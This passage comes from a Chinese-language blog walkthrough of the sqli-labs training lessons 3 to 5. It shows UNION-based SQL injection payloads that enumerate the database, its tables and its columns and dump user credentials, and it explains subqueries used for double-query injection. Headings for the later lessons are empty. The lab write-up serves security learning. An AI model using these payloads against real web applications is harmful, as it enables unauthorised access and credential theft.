keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106200349876-1604667081399.png" alt="image-20201106200349876" loading="lazy"></p><p>或者 查询数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106200631160-1604667081399.png" alt="image-20201106200631160" loading="lazy"></p><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>根据提示，知道这是双引号注入</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>'没错误?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">"错误发现是双引号加括号形成的查询语句?id=1"</span><span class="token punctuation">)</span><span class="token comment">--+正确回显</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211359829.png" alt="image-20201106211359829" loading="lazy"></p><p>接下来又是常规操作</p><p><strong>爆库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211719441.png" alt="image-20201106211719441" loading="lazy"></p><p>可以得到数据库名字security</p><p><strong>爆表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'security'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211827101.png" alt="image-20201106211827101" loading="lazy"></p><p><strong>爆列</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211907985.png" alt="image-20201106211907985" loading="lazy"></p><p><strong>爆数据</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>"<span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> users<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106211943328.png" alt="image-20201106211943328" loading="lazy"></p><p>或者 查询数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">") union select 1,username,password from users where id=3--+or?id=3"</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201106212009822.png" alt="image-20201106212009822" loading="lazy"></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>正常?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'错误?id=1'</span><span class="token comment">--+正常但是注入不出库名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>根据提示可知该使用双查询注入</p><p><strong>子查询</strong></p><p>在说双查询之前，先介绍一下子查询。</p><p>查询：任何SQL语句都是查询。但此术语一般指SELECT语句。<br>SQL还允许创建子查询（subquery），即嵌套在其他查询中的查询。</p><p>举个简单的例子，Select concat((select database()));<br>执行的时候，先从子查询进行。因此执行select database()这个语句就会把当前的数据库的名称查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如数据库名字叫’a’和’b’，那么concat(‘a’,’b’)后，结果就是ab了。</p><p>j简单来说，双查询注入其实就是一个select语句中再嵌套一个select语句，嵌套的这个语句称作子查询，例如：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/06/sqli-labs1-20/image-20201107171718737.png" alt="image-20201107171718737" loading="lazy"></p><p>后续注入，需要先了解count()、rand()、floor()、concat()这三个函数的功能以及group by语句的用法。</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">rand<span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//返回0~1间的小数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">floor<span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//向下取整。向上取整：ceiling()</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数 <span class="token comment">//汇总函数：返回匹配指定条件的行数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">group</span> <span class="token keyword">by</span>子句 <span class="token comment">//根据一个或多个列对结果集进行分组</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2>]]></content>
      
      
      <categories>
          
          <category> sqli-labs1-20 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlilabs </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
